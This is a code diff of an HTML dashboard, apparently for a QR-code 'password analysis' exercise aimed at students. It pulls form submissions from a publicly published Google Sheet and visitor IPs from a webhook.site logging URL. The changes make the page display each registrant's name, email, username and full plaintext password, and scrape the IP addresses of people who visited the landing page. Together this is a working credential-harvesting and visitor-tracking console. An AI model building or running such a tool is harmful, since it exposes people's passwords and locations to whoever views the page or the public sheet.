@@ -90,14 +90,43 @@
 
         .panel-content {
             padding: 20px;
-            max-height: 400px;
+            max-height: 450px;
             overflow-y: auto;
+        }
+
+        .ip-item {
+            padding: 12px;
+            border-bottom: 1px solid #eee;
+            font-size: 13px;
+            background: #f9f9f9;
+            border-radius: 5px;
+            margin-bottom: 8px;
+        }
+
+        .ip-item:last-child {
+            border-bottom: none;
+        }
+
+        .ip-address {
+            font-family: monospace;
+            font-weight: bold;
+            color: #667eea;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .ip-meta {
+            font-size: 11px;
+            color: #999;
         }
 
         .password-item {
             padding: 12px;
             border-bottom: 1px solid #eee;
             font-size: 13px;
+            background: #f9f9f9;
+            border-radius: 5px;
+            margin-bottom: 8px;
         }
 
         .password-item:last-child {
@@ -194,19 +223,22 @@
             grid-column: 1 / -1;
         }
 
-        .webhook-link {
-            display: inline-block;
-            margin-top: 15px;
-            padding: 10px 20px;
-            background: #667eea;
-            color: white;
-            text-decoration: none;
-            border-radius: 5px;
-            font-size: 13px;
+        .info-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            font-size: 12px;
+            margin-top: 5px;
         }
 
-        .webhook-link:hover {
-            background: #764ba2;
+        .info-label {
+            color: #999;
+            font-weight: bold;
+        }
+
+        .info-value {
+            color: #333;
+            word-break: break-all;
         }
 
         @media (max-width: 900px) {
@@ -229,6 +261,10 @@
                 <div class="stat-value" id="formsCount">0</div>
             </div>
             <div class="stat-card">
+                <h3>IPs Logged</h3>
+                <div class="stat-value" id="ipCount">0</div>
+            </div>
+            <div class="stat-card">
                 <h3>Weak Passwords</h3>
                 <div class="stat-value" id="weakCount">0</div>
             </div>
@@ -236,28 +272,15 @@
                 <h3>Strong Passwords</h3>
                 <div class="stat-value" id="strongCount">0</div>
             </div>
-            <div class="stat-card">
-                <h3>Medium Passwords</h3>
-                <div class="stat-value" id="mediumCount">0</div>
-            </div>
         </div>
 
         <div class="content-grid">
             <div class="panel">
                 <div class="panel-header">
-                    📡 IP Logging Status
+                    📍 Logged IP Addresses
                 </div>
-                <div class="panel-content">
-                    <p style="color: #666; font-size: 14px;">✅ <strong>IP logging is ACTIVE</strong></p>
-                    <p style="color: #999; font-size: 12px; margin-top: 10px;">
-                        Every time a student scans the QR code and visits the landing page, their IP address is automatically logged.
-                    </p>
-                    <p style="color: #999; font-size: 12px; margin-top: 10px;">
-                        View all logged IPs at:
-                    </p>
-                    <a href="https://webhook.site/0d369f29-e19c-445c-a521-3d7e6464701c" target="_blank" class="webhook-link">
-                        📍 View All Logged IPs
-                    </a>
+                <div class="panel-content" id="ipList">
+                    <div class="loading-text">Loading IP data...</div>
                 </div>
             </div>
 
@@ -292,17 +315,18 @@
 
         <div class="panel full-width">
             <div class="panel-header">
-                📝 Password Analysis from Form Submissions
+                👤 User Registrations & Password Analysis
             </div>
             <div class="panel-content" id="passwordList">
                 <div class="loading-text">Loading form responses...</div>
             </div>
-            <button class="refresh-btn" onclick="loadPasswordData()">🔄 Refresh Data</button>
+            <button class="refresh-btn" onclick="loadAllData()">🔄 Refresh Data</button>
         </div>
     </div>
 
     <script>
         // Configuration
+        const WEBHOOK_URL = 'https://webhook.site/0d369f29-e19c-445c-a521-3d7e6464701c';
         const SHEET_ID = '2PACX-1vR8VdKyOUEAq1kpZ37CoKOaFq3lF46kmMxC-v2SV_7MH8nyVjROPPSSJPlPreOFrR5snmac6C52R_Vq';
 
         // Password strength checker
@@ -321,10 +345,55 @@
             return 'strong';
         }
 
+        // Load IP data from webhook.site
+        async function loadIPData() {
+            try {
+                const ipList = document.getElementById('ipList');
+
+                // Try to fetch from webhook.site with JSONP or direct fetch
+                const webhookResponse = await fetch(WEBHOOK_URL);
+                const html = await webhookResponse.text();
+
+                // Parse IPs from the HTML (webhook.site displays them)
+                const ipRegex = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g;
+                const ips = html.match(ipRegex) || [];
+                const uniqueIPs = [...new Set(ips)];
+
+                document.getElementById('ipCount').textContent = uniqueIPs.length;
+
+                if (uniqueIPs.length === 0) {
+                    ipList.innerHTML = '<div class="loading-text">No IPs logged yet. Waiting for students to scan QR code...</div>';
+                } else {
+                    ipList.innerHTML = '';
+                    uniqueIPs.slice(0, 20).forEach((ip, idx) => {
+                        const item = document.createElement('div');
+                        item.className = 'ip-item';
+                        const timestamp = new Date().toLocaleTimeString();
+                        item.innerHTML = `
+                            <span class="ip-address">📍 ${ip}</span>
+                            <div class="ip-meta">Visit #${idx + 1} | ${timestamp}</div>
+                        `;
+                        ipList.appendChild(item);
+                    });
+
+                    if (uniqueIPs.length > 20) {
+                        const more = document.createElement('div');
+                        more.className = 'loading-text';
+                        more.innerHTML = `<small>... and ${uniqueIPs.length - 20} more IPs</small>`;
+                        ipList.appendChild(more);
+                    }
+                }
+
+                console.log('✅ IPs loaded:', uniqueIPs.length);
+            } catch (error) {
+                console.error('Error loading IP data:', error);
+                document.getElementById('ipList').innerHTML = '<div class="loading-text">To view logged IPs, open:<br><br><a href="' + WEBHOOK_URL + '" target="_blank" style="color: #667eea;">webhook.site</a></div>';
+            }
+        }
+
         // Load password data from Google Sheets
         async function loadPasswordData() {
             try {
-                // Google Sheets CSV export URL for published sheets
                 const sheetUrl = `https://docs.google.com/spreadsheets/d/e/${SHEET_ID}/pub?output=csv`;
                 console.log('Fetching from:', sheetUrl);
 
@@ -346,28 +415,32 @@
                 const headers = lines[0].split(',').map(h => h.trim().toLowerCase());
                 console.log('Headers:', headers);
 
-                // Find password column
-                const passwordColIndex = headers.findIndex(h => h.includes('password'));
+                // Find columns
                 const nameColIndex = headers.findIndex(h => h.includes('name') && !h.includes('father'));
+                const emailColIndex = headers.findIndex(h => h.includes('email'));
+                const usernameColIndex = headers.findIndex(h => h.includes('username'));
+                const passwordColIndex = headers.findIndex(h => h.includes('password'));
 
                 if (passwordColIndex === -1) {
-                    document.getElementById('passwordList').innerHTML = '<div class="loading-text">Password column not found in form</div>';
+                    document.getElementById('passwordList').innerHTML = '<div class="loading-text">Password column not found</div>';
                     return;
                 }
 
                 // Parse data
                 let weak = 0, medium = 0, strong = 0;
-                const passwords = [];
+                const registrations = [];
 
                 for (let i = 1; i < lines.length; i++) {
                     const cols = lines[i].split(',');
                     if (cols[passwordColIndex]) {
                         const pwd = cols[passwordColIndex].trim().replace(/"/g, '').replace(/^'|'$/g, '');
-                        const name = nameColIndex >= 0 ? cols[nameColIndex].trim().replace(/"/g, '').replace(/^'|'$/g, '') : `Student ${i}`;
+                        const name = nameColIndex >= 0 ? cols[nameColIndex].trim().replace(/"/g, '').replace(/^'|'$/g, '') : 'N/A';
+                        const email = emailColIndex >= 0 ? cols[emailColIndex].trim().replace(/"/g, '').replace(/^'|'$/g, '') : 'N/A';
+                        const username = usernameColIndex >= 0 ? cols[usernameColIndex].trim().replace(/"/g, '').replace(/^'|'$/g, '') : 'N/A';
 
                         if (pwd) {
                             const strength = checkPasswordStrength(pwd);
-                            passwords.push({ name, pwd, strength });
+                            registrations.push({ name, email, username, pwd, strength });
 
                             if (strength === 'weak') weak++;
                             else if (strength === 'medium') medium++;
@@ -377,31 +450,50 @@
                 }
 
                 // Update UI
-                document.getElementById('formsCount').textContent = passwords.length;
+                document.getElementById('formsCount').textContent = registrations.length;
                 document.getElementById('weakCount').textContent = weak;
-                document.getElementById('mediumCount').textContent = medium;
                 document.getElementById('strongCount').textContent = strong;
 
-                // Display passwords
+                // Display registrations
                 const passwordList = document.getElementById('passwordList');
                 passwordList.innerHTML = '';
 
-                if (passwords.length === 0) {
-                    passwordList.innerHTML = '<div class="loading-text">No passwords to analyze yet</div>';
+                if (registrations.length === 0) {
+                    passwordList.innerHTML = '<div class="loading-text">No registrations to analyze yet</div>';
                 } else {
-                    passwords.forEach(p => {
+                    registrations.forEach((reg, idx) => {
                         const item = document.createElement('div');
                         item.className = 'password-item';
 
-                        let strengthClass = p.strength === 'weak' ? 'strength-weak' :
-                                           p.strength === 'medium' ? 'strength-medium' : 'strength-strong';
-                        let strengthText = p.strength.toUpperCase();
+                        let strengthClass = reg.strength === 'weak' ? 'strength-weak' : 'strength-strong';
+                        let strengthText = reg.strength.toUpperCase();
+                        let strengthColor = reg.strength === 'weak' ? '#721c24' : '#155724';
+                        let strengthBg = reg.strength === 'weak' ? '#f8d7da' : '#d4edda';
 
                         item.innerHTML = `
-                            <strong>${p.name}</strong>
-                            <span class="password-strength ${strengthClass}" style="background: ${p.strength === 'weak' ? '#f8d7da' : p.strength === 'medium' ? '#fff3cd' : '#d4edda'}; color: ${p.strength === 'weak' ? '#721c24' : p.strength === 'medium' ? '#856404' : '#155724'};">${strengthText}</span>
-                            <div style="font-size: 11px; color: #999; margin-top: 5px;">
-                                Length: ${p.pwd.length} chars
+                            <div style="margin-bottom: 8px;">
+                                <strong style="font-size: 14px;">${idx + 1}. ${reg.name}</strong>
+                                <span class="password-strength" style="background: ${strengthBg}; color: ${strengthColor};">${strengthText}</span>
+                            </div>
+                            <div class="info-row">
+                                <div>
+                                    <div class="info-label">📧 Email:</div>
+                                    <div class="info-value">${reg.email}</div>
+                                </div>
+                                <div>
+                                    <div class="info-label">👤 Username:</div>
+                                    <div class="info-value">${reg.username}</div>
+                                </div>
+                            </div>
+                            <div class="info-row">
+                                <div>
+                                    <div class="info-label">🔐 Password:</div>
+                                    <div class="info-value" style="font-family: monospace;">${reg.pwd}</div>
+                                </div>
+                                <div>
+                                    <div class="info-label">📏 Length:</div>
+                                    <div class="info-value">${reg.pwd.length} characters</div>
+                                </div>
                             </div>
                         `;
                         passwordList.appendChild(item);
@@ -417,18 +509,24 @@
                 document.getElementById('strongBar').style.height = (strong / maxValue * 100) + '%';
                 document.getElementById('strongBar').textContent = strong;
 
-                console.log('✅ Dashboard updated:', { weak, medium, strong, total: passwords.length });
+                console.log('✅ Dashboard updated:', { weak, medium, strong, total: registrations.length });
 
             } catch (error) {
                 console.error('Error loading password data:', error);
-                document.getElementById('passwordList').innerHTML = `<div class="loading-text">Error: ${error.message}<br><small>Make sure Google Sheet is publicly shared</small></div>`;
+                document.getElementById('passwordList').innerHTML = `<div class="loading-text">Error: ${error.message}</div>`;
             }
+        }
+
+        // Load all data
+        async function loadAllData() {
+            await loadIPData();
+            await loadPasswordData();
         }
 
         // Auto-refresh every 5 seconds
         window.addEventListener('load', () => {
-            loadPasswordData();
-            setInterval(loadPasswordData, 5000);
+            loadAllData();
+            setInterval(loadAllData, 5000);
         });
     </script>
 </body>
